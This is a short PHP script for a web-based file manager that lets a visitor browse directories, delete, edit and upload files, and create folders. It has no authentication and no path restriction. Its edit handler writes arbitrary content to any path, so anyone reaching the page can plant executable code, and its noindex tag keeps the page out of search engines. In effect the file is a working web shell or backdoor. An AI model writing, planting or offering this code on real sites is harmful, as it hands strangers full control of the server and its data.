<?php
$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($cwd);

if (isset($_POST['mkdir'])) {
    $newdir = basename($_POST['dirname']);
    mkdir($newdir);
    echo "<p>📁 Folder created: $newdir</p>";
}

if (isset($_GET['delete'])) {
    unlink($_GET['delete']);
    echo "<p>🗑️ File deleted: " . htmlspecialchars($_GET['delete']) . "</p>";
}

if (isset($_POST['editfile'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    echo "<p>✅ File updated: " . htmlspecialchars($_POST['file']) . "</p>";
}

if (isset($_FILES['upload'])) {
    $target = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p>✅ File uploaded: $target</p>";
    } else {
        echo "<p>❌ Upload failed</p>";
    }
}

echo "<!DOCTYPE html><html><head>
<meta charset='UTF-8'>
<meta name='robots' content='noindex,nofollow'>
<style>
    body { font-family: Arial; padding: 20px; }
    ul { list-style: none; padding-left: 0; }
    li { margin-bottom: 5px; }
    a { text-decoration: none; margin-left: 10px; }
    textarea { width: 100%; max-width: 800px; }
</style>
</head><body>";

echo "<h2>📂 Current Directory: " . htmlspecialchars($cwd) . "</h2>";

$items = scandir($cwd);
sort($items);

echo "<ul>";
foreach ($items as $item) {
    if ($item === ".") continue;
    $full = $cwd . DIRECTORY_SEPARATOR . $item;
    echo "<li>";
    if (is_dir($full)) {
        echo "📁 <a href='?path=" . urlencode($full) . "'>$item</a>";
    } else {
        echo "📄 $item";
        echo "<a href='?path=" . urlencode($cwd) . "&delete=" . urlencode($full) . "'>🗑️</a>";
        echo "<a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($full) . "'>✏️</a>";
    }
    echo "</li>";
}
echo "</ul>";

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (is_file($f)) {
        $c = htmlspecialchars(file_get_contents($f));
        echo "
        <h3>✏️ Edit File: " . htmlspecialchars($f) . "</h3>
        <form method='POST'>
            <input type='hidden' name='file' value='" . htmlspecialchars($f) . "'>
            <textarea name='content' rows='15'>$c</textarea><br>
            <button type='submit' name='editfile'>💾 Save</button>
        </form>
        ";
    }
}

echo "
<h3>📤 Upload File</h3>
<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload</button>
</form>
";

echo "
<h3>📁 Create Folder</h3>
<form method='POST'>
    <input type='text' name='dirname' placeholder='New Folder'><br>
    <button type='submit' name='mkdir'>Create</button>
</form>
";

echo "</body></html>";
?>
